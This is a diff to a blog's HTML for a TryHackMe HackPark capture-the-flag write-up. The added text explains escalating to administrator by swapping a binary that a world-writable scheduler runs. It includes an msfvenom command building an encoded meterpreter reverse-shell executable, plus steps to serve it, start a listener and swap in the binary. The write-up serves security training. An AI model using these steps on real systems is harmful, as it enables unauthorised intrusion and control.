@@ -540,7 +540,7 @@
             <span class="post__minutes">
               
               
-                8 min read
+                10 min read
               
               <time class="post__date"
                 datetime="2021-12-31T18:20:00+00:00">Dec 31, 2021</time>
@@ -813,16 +813,47 @@ any misconfigurations and privilege escalation possibilities.
 <p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/24.png" alt="" /><br />
 <br /><strong>InvokeAllChecks</strong> will diagnose any detectable vulnerabilities along with their descriptions.
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/25.png" alt="" /><br />
+<br /><br />One of the results is worth paying attention to. There is a Windows Scheduler service autoruns at the system logon. 
+The problem is that everyone can modify all the files stored in the directory that contains 
+W3Scheduler.exe. Since the scheduler is run with admin privileges, 
+I can run my malicious executables with admin privileges by replacing the W3Scheduler.exe.
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/26.png" alt="" /><br />
+<br />Some resources for autorun exploitation:
+<br />- <a href="https://steflan-security.com/windows-privilege-escalation-exploiting-autorun/">Windows Privilege Escalation – Exploiting Autorun</a>
+<br />- <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries">Privilege Escalation with Autoruns</a>
+<br /><br />Let’s check the the <a href="https://networkencyclopedia.com/discretionary-access-control-list-dacl/"><strong>DACL(Discretionary Access Control List)</strong></a> of the ‘C:\Program Files (x86)\SystemScheduler’ with <a href="https://www.techtarget.com/searchwindowsserver/definition/icacls"><strong>icacls</strong></a>. 
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/27.png" alt="" /><br />
+It is obvious that everyone have modify permission on this folder.
+<br /><br /> Let’s see what the directory contains along with W3Scheduler.exe
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/28.png" alt="" /><br />
+<br /><br />Replacing the W3Scheduler.exe with a backdoor would not work since it is a virtual box and once
+rebooted, it will reset itself to factory settings. That is why we need to dig further to find out how
+to walk around this.
+<br /><br />There is a log file in the directory, let’s see what is inside.
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png" alt="" /><br />
+The scheduler executes a binary called Messages.exe every 23 seconds. 
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png" alt="" /><br />
-<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/31.png" alt="" /><br />
+This binary is also in the modifiable directory. If we create a 
+backdoor and put it where Message.exe sits, we can escalate our privileges.
+<br /><br />Once again, let’s create a meterpreter reverse shell binary.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">x86</span><span class="w"> </span><span class="nt">--encoder</span><span class="w"> </span><span class="nx">x86/shikata_ga_nai</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="p">{</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">}</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="p">{</span><span class="n">SOME</span><span class="w"> </span><span class="nx">FREE</span><span class="w"> </span><span class="nx">PORT</span><span class="p">}</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">exe</span><span class="w"> </span><span class="nx">revshell.exe</span></code></pre></figure>
+
+<p>Then start the python server.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">sudo</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/31.png" alt="" /><br />
+<br /><br />Start the multi handler listener.
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/32.png" alt="" /><br />
+<br /><br />Rename the executable as Messages.exe (I forgot it should be named Messages.exe when creating it). 
+Then, replace the real binary with the malicious backdoor.
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png" alt="" /><br />
+<br /><br />Sit back and wait for session to initialize.
 <img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png" alt="" /><br />
-<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png" alt="" /><br /></p>
+Voilà! We are the administrator now.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png" alt="" /><br />
+<br /><br />Thanks for reading.</p>
 
     </div>
 
